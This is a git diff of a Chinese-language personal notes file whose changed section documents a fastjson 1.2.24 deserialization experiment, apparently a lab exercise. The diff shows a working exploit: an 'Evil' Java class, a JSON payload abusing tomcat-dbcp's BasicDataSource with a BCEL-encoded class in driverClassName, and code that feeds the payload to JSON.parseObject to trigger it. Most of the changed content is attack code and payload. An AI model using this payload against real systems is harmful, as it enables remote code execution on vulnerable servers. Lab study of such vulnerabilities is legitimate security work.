@@ -130,13 +130,12 @@ mspan从操作系统获取的内存数
 
 ### Share
 
-fastjson 漏洞实验
+#### fastjson 漏洞实验
 
-实验版本
 fastjson：1.2.24
 tomcat-dbcp：7.0.35
 
-1、生成代码class
+##### 1、生成代码class
 package com.test.fastjsondemo.demo;
 
 import java.io.IOException;
@@ -164,7 +163,7 @@ public class Evil {
     }
 }
 
-2、构造json
+##### 2、构造json
 {
   "@type" : "org.apache.tomcat.dbcp.dbcp.BasicDataSource",
   "driverClassLoader" :
@@ -173,7 +172,7 @@ public class Evil {
   },
   "driverClassName" : "$$BCEL$$$l$8b$I$A$A$A$A$A$A$AmSKS$d3$60$U$3d$81$da$84$d2$f2$uEy$L$beh$L4$8a$f8$y$3e$QA$R$E$c62$bapt$s$84$d8$J$b6I$a7I$Z$dc$e9$9e$85$3b$c7$F$LWn$5c$88$p$e8$b0$d0$bd$ff$D$H$ff$84$e3$f9B_T$s3_r$cf$bd$e7$dc$fb$dd$7b$f3$eb$ef$ee$P$Ac$98m$40$iC$K$86$D$YA$a2$B$adP$V$9cWpA$7c$8e$w$b8$Y$40$Yc$K$$$v$b8$i$c0$V$5cUpM$bc$af$cbH$K$ca$b8$8c$h2nJ$f0YZ$d6$90$Q$9e$5b$d5$d645$a3Yi5$e5$e6M$x$9d$94P$af$a5$e9$92f$q$c8i$c3$9d$f7$C$p$d1$d8Q$a1$beI$7b$85$de$e69$d32$e6$L$d9e$p$bf$a4$zg$88$c8N$89$d9$k$fd$9f$Y$7b$y$c1O$ed$J$91$a8$3e$gc$w$bfS4$7d$d1$Z$cf$3dnZ$a6$7b$d3s$d3$ML$ad$ebF$ce5m$cb$91qK$822$aeg$8a$B$a1$94$ab$e9$_$lj9$_5$_$ca$e8$94$5d$c8$eb$c6$b4$vJ$JL$ad$99$99$d1$84$uB$c6$ed$m$spGB$8b$d9$afe$fbY$82k$e4E$9d$D2$s$83$b8$8b$9e$m$da$Q$v$f9$9d$8a$9f$97$ac$a2$b0$d2$81$m$daq$bc$E$3bU$f0$AN$b1$b3$k$ac$b3$5e7_$d0$5d$3b$3fJ$89$c8$d3$fd$9fo$f7$3fl$fc$d9$7c$ff$fb$f5$9b$bd$8d$dd$bd$cdw$cfdL$F1$8d$7b$S$G$ec$9ca$f5$ab$T$b9$5c$c6$d45$ef$b2$ea$a4$96$d1$L$Z$8d$C$J$z$97$L$e2$3e$d8$ac$b6JG$cb$7d$R$d5$3f$90$c0$94Y$d55$iW$7d$a19$ee$aac$5b$xF$d6V$bd$c3k$E$efVa$_$y$af$g$ba$5b$S4muf$a1$yx$u0$f5$caq$8d$y$a7a$X$Y$de$3eW$8a_$e4$3c$5dN$d5$d0$b2$c9$w$99$w$98$bb$90$TV$86$82$ad$V$c1G$F$cb5$c5$7e$E$d8$d1$b2$d1$7eh$cd$8a$b0$d83c$dd$d0$r$M$k$b5KU$d0b$de$d6$N$c7I$d6l$dd$c1$z$b9u$iM$x$7f$Q$a0$O$92$98$b3$f7$c5$v$f2$ed$tr$C$j$3c$3bi$c5$bc$I$m$f4$FR$b8n$H$f5$f1$af$f0$7d$s$m$a1$8bg$80n$40$86$c2GB7z$8a$b4$Eq$e1i$S$b4c$826$b4$N$dfV$99$d7$84z$9eA$b2B$7c$9a$88$f6$a2$ef$a8$94$fe$83$94$f2$a7$9a$94m$a4F$88$9cD$ffQ$v$VA$eb$de$86$5c$9b$b2$83$bcN$a6$ec$o$ca$f5$qCpGJ$v$e3$df$d0$m$f8$B$f2k$a9$7d$f01$9d$d8$ea$d3$b4$7c$f4$9d$a1$d8Y$8a$i$U$f0$bc$u$d2$x$E$g$v$f0$j$c1ph$HMO$3e$a2q$96$60$7c$H$z$5b$MQ$d8$fb$I$9a$Z$$$c4$bb$d8qxR$83$c4$e3$f4D9$89$Y$5b9$8cs$5es$eb$96d$M$ca$qF$bd1$c5$fe$B$b3$a1$ea1$F$F$A$A"
 }
-3、运行起来
+##### 3、运行起来
 StringBuffer Buffer = new StringBuffer();
 readToBuffer(Buffer,"/Users/liushulong/Desktop/fastjson/command.json");
 Object obj= JSON.parseObject(Buffer.toString());
